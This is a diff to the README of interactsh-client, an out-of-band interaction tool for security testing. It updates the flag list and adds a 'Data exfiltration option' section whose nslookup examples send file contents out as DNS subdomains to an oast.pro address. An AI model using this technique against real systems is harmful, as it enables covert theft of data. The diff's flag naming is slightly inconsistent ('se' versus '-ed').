@@ -60,7 +60,7 @@ INPUT:
    -s, -server string  interactsh server(s) to use (default "oast.pro,oast.live,oast.site,oast.online,oast.fun,oast.me")
 
 CONFIG:
-   -config string                           flag configuration file (default "$HOME/.config/interactsh-client/config.yaml")
+   -config string                           flag configuration file (default "/home/kali/.config/interactsh-client/config.yaml")
    -n, -number int                          number of interactsh payload to generate (default 1)
    -t, -token string                        authentication token to connect protected interactsh server
    -pi, -poll-interval int                  poll interval in seconds to pull interaction data (default 5)
@@ -68,6 +68,7 @@ CONFIG:
    -cidl, -correlation-id-length int        length of the correlation id preamble (default 20)
    -cidn, -correlation-id-nonce-length int  length of the correlation id nonce (default 13)
    -sf, -session-file string                store/read from session file
+   -kai, -keep-alive-interval value         keep alive interval (default 1m0s)
 
 FILTER:
    -m, -match string[]   match interaction based on the specified pattern
@@ -75,21 +76,23 @@ FILTER:
    -dns-only             display only dns interaction in CLI output
    -http-only            display only http interaction in CLI output
    -smtp-only            display only smtp interactions in CLI output
+   -asn                   include asn information of remote ip in json output
 
 UPDATE:
    -up, -update                 update interactsh-client to latest version
    -duc, -disable-update-check  disable automatic interactsh-client update check
-   
+
 OUTPUT:
    -o string                         output file to write interaction data
    -json                             write output in JSONL(ines) format
-   -ps, -payload-store               enable storing generated interactsh payload to file
+   -silent                           display interactions only
+   -ed                               save exfiltrated data in the format content.filename.extension.interactsh-address.oast.io
+   -ps, -payload-store               write generated interactsh payload to file
    -psf, -payload-store-file string  store generated interactsh payloads to given file (default "interactsh_payload.txt")
    -v                                display verbose interaction
 
 DEBUG:
    -version            show version of the project
-   -health-check, -hc  run diagnostic check up
 ```
 
 ## Interactsh CLI Client
@@ -212,6 +215,27 @@ We maintain a list of default Interactsh servers to use with `interactsh-client`
 - oast.me
 
 Default servers are subject to change/rotate/down at any time, thus we recommend using a self-hosted interactsh server if you are experiencing issues with the default server.
+
+### Data exfiltration option
+
+Using the `se` flag, `interactsh-client` will append the content of requests in the format `content.filename.extension.id.domain.com` to a given `filename.extension`.
+
+```sh
+interactsh-client -ed
+```
+
+Using this option, it is possible to exfiltrate multiple files to the current directory as long as their content is sent through multiple DNS queries. As an example, see the input below will produce the showed files:
+
+```
+$ nslookup abcde.file.txt.c59e3crp82ke7bcnedq0cfjqdpeyyyyyn.oast.pro
+$ nslookup fghij.file.txt.c59e3crp82ke7bcnedq0cfjqdpeyyyyyn.oast.pro
+$ nslookup 1234.test.txt.c59e3crp82ke7bcnedq0cfjqdpeyyyyyn.oast.pro
+$ nslookup 567.test.txt.c59e3crp82ke7bcnedq0cfjqdpeyyyyyn.oast.pro
+$ cat file.txt
+abcdefghij
+$ cat test.txt
+1234567
+```
 
 ### Using Protected Self-Hosted server
 
